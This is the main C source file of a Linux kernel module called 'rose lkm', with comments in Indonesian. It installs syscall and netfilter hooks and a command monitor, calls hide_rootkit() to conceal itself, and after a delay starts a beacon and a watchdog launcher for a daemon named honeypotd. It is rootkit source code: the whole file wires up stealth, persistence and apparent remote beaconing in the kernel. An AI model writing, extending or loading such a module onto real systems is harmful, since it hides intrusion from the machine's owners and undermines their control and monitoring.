#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/signal.h>
#include <linux/workqueue.h>
#include <linux/reboot.h>
#include <linux/sched/signal.h>

#include "include/file_protection.h"
#include "include/ftrace_manager.h"
#include "include/hookers.h"
#include "include/utils.h"
#include "include/config.h"
#include "include/netfilter_manager.h"
#include "include/beacon.h"
#include "include/command_monitor.h"
#include "include/launcher.h"

#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
#define VERSION_NOT_SUPPORTED
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("zwrh");
MODULE_DESCRIPTION("rose lkm");
MODULE_VERSION("1");

static struct delayed_work init_work;
static struct notifier_block reboot_notifier;

/*
 * Reboot notifier — dipanggil saat shutdown/reboot.
 * Ini memastikan watchdog thread berhenti & honeypotd dimatikan
 * SEBELUM systemd mulai mematikan service, jadi ga ada loop respawn.
 */
static int reboot_callback(struct notifier_block *nb, unsigned long code, void *data)
{
    printk(KERN_DEBUG "rose: reboot/shutdown detected (code=%lu), stopping...\n", code);

    /* Hentikan watchdog & launcher — ini stop kthread + kill daemon */
    launcher_stop();
    beacon_stop();

    return NOTIFY_DONE;
}

static void delayed_init_fn(struct work_struct *work)
{
    launcher_start();
    beacon_start();
}

static void __exit mod_exit(void)
{
    cancel_delayed_work_sync(&init_work);
    launcher_sysfs_exit();
    unregister_reboot_notifier(&reboot_notifier);
    remove_all_hooks();
    remove_file_protection_hooks();
    beacon_stop();
    unregister_netfilter_hook();
    command_monitor_exit();
    launcher_stop();
    printk(KERN_DEBUG "Successfully unloaded\n");
}

static int __init mod_init(void)
{
    int err;

#ifdef VERSION_NOT_SUPPORTED
    printk(KERN_DEBUG "Version not supported\n");
    return -1;
#endif

    err = install_all_hooks();
    if (err) {
        return err;
    }

    // err = install_file_protection_hooks();
    // if (err) {
    //     return err;
    // }

    err = register_netfilter_hook();
    if (err) {
        return err;
    }

    err = command_monitor_init();
    if (err) {
        return err;
    }

    /* Sysfs interface */
    err = launcher_sysfs_init();
    if (err) {
        printk(KERN_ERR "rose: sysfs init failed\n");
        return err;
    }

    /* Reboot notifier — biar watchdog ga loop pas shutdown */
    reboot_notifier.notifier_call = reboot_callback;
    reboot_notifier.priority = 0;
    register_reboot_notifier(&reboot_notifier);

    printk(KERN_DEBUG "Successfully loaded\n");
    hide_rootkit();

    /* Tunda 90 detik — biar systemd & network siap */
    INIT_DELAYED_WORK(&init_work, delayed_init_fn);
    schedule_delayed_work(&init_work, msecs_to_jiffies(90000));

    return 0;
}

module_init(mod_init);
module_exit(mod_exit);


